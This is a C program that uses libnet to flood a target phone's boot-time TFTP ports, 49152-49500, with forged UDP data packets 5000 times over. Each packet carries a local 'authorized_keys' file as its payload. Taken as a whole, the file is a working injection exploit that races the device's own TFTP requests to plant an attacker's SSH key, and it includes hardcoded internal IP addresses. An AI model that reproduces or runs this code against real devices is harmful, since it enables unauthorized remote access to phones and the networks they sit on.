//#include <arpa/inet.h>
#include <stdio.h>

#include <arpa/inet.h>
#include <libnet.h>

typedef struct {
    unsigned short type;
    unsigned short blockno;
    unsigned char data[512];
} tftp_packet;

tftp_packet spam;

#define SPAM_FILE "authorized_keys"
static const unsigned short SPAM_LOW_DST_PORT = 49152;
static const unsigned short SPAM_HIGH_DST_PORT = 49500;

// This is the actual high port, but the phones boot starting at 49152 and only
// request about 4 files in the boot process.
//static const unsigned short SPAM_HIGH_DST_PORT = 53248;
static const unsigned char LOCAL_IP[4] = { 10,4,149,2 };
//static const unsigned char LOCAL_IP[4] = { 10,64,1,16 };
// dest ip is 10.40.234.84

static const unsigned short SPAM_SRC_PORT = 49152;

int make_spam() {
    FILE *f;
    int n;
    spam.type    = htons(3); // 3 = data
    spam.blockno = htons(1); // block numbers start with 1
    f = fopen(SPAM_FILE, "rb");
    if (!f) {
        printf("Couldn't open %s.\n", SPAM_FILE);
        return 0;
    }
    n = fread(spam.data, 1, 512, f);
    fclose(f);
    return n+4;
}

void spam_spam_spam_spam(char *ip_str, char *iface) {
    libnet_ptag_t ip_tag = 0;
    char errbuf[1024];
    int payload_len = 0;
    libnet_t *l = NULL;
    int ret = 0;
    int port = 0;
    int rep = 0;
    static const int NREPS = 5000;
    u_int32_t dst_ip_addr/*, src_ip_addr*/;
    
    payload_len = make_spam();
    if (!payload_len)
        goto cleanup;

    l = libnet_init(LIBNET_RAW4, iface, errbuf);
    if (!l) {
        printf("libnet init failed: %s\n", errbuf);
        goto cleanup;
    }

    dst_ip_addr = libnet_name2addr4(l, ip_str, LIBNET_DONT_RESOLVE);
    if (dst_ip_addr == -1) {
        printf("Error converting IP address %s: %s\n", ip_str, libnet_geterror(l));
        goto cleanup;
    }

	/*
    src_ip_addr = libnet_get_ipaddr4(l);
    if (src_ip_addr == -1) {
        printf("Error getting local IP address: %s\n", libnet_geterror(l));
        printf("Reverting to %d.%d.%d.%d\n", 
                    LOCAL_IP[0],
                    LOCAL_IP[1],
                    LOCAL_IP[2],
                    LOCAL_IP[3]);
        src_ip_addr = *((u_int32_t*)LOCAL_IP);
    }
*/

    printf("Spamming %d.%d.%d.%d:%d-%d (%d ports) %d times.\n", 
		((unsigned char *)&dst_ip_addr)[0],
		((unsigned char *)&dst_ip_addr)[1],
		((unsigned char *)&dst_ip_addr)[2],
		((unsigned char *)&dst_ip_addr)[3],
		SPAM_LOW_DST_PORT, SPAM_HIGH_DST_PORT,
		SPAM_HIGH_DST_PORT - SPAM_LOW_DST_PORT, NREPS);

    for (rep = 0; rep < NREPS; rep++) {
        for (port = SPAM_LOW_DST_PORT; port < SPAM_HIGH_DST_PORT; port++) 
        {
            ip_tag = LIBNET_PTAG_INITIALIZER;

            /* prepare the packet */
            ip_tag = libnet_build_udp
                (
                 SPAM_SRC_PORT,         // source port
                 port,                  // dest port
                 payload_len + LIBNET_UDP_H,         // length
                 0,                     // checksum 
                 (unsigned char *)(&spam),                 // payload
                 payload_len,           // payload_len
                 l,                     // context
                 ip_tag
                );
            if (ip_tag <= 0)
            {
                printf("udp packet build failed: %s\n", libnet_geterror(l));
                goto cleanup;
            }

            ip_tag = libnet_autobuild_ipv4
                (
                 payload_len + LIBNET_IPV4_H + LIBNET_UDP_H,  // len
                 IPPROTO_UDP,           // proto
                 dst_ip_addr,           // dest ip
                 l
                );

            if (ip_tag <= 0)
            {
                printf("ipv4 packet build failed: %s\n", libnet_geterror(l));
                goto cleanup;
            }

            ret = libnet_write(l);
            if (ret < 0)
            {
                printf("packet write failed: %s\n", libnet_geterror(l));
                goto cleanup;
            }

            libnet_clear_packet(l);
        }
        printf(".");
    }

cleanup:
    if (l)
        libnet_destroy(l);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <phone_ip> [if].\n\nMust be run as root.\n", argv[0]);
        exit(1);
    }
    spam_spam_spam_spam(argv[1], argc > 2 ? argv[2] : NULL);
    printf("done.\n");
    return 0;
}
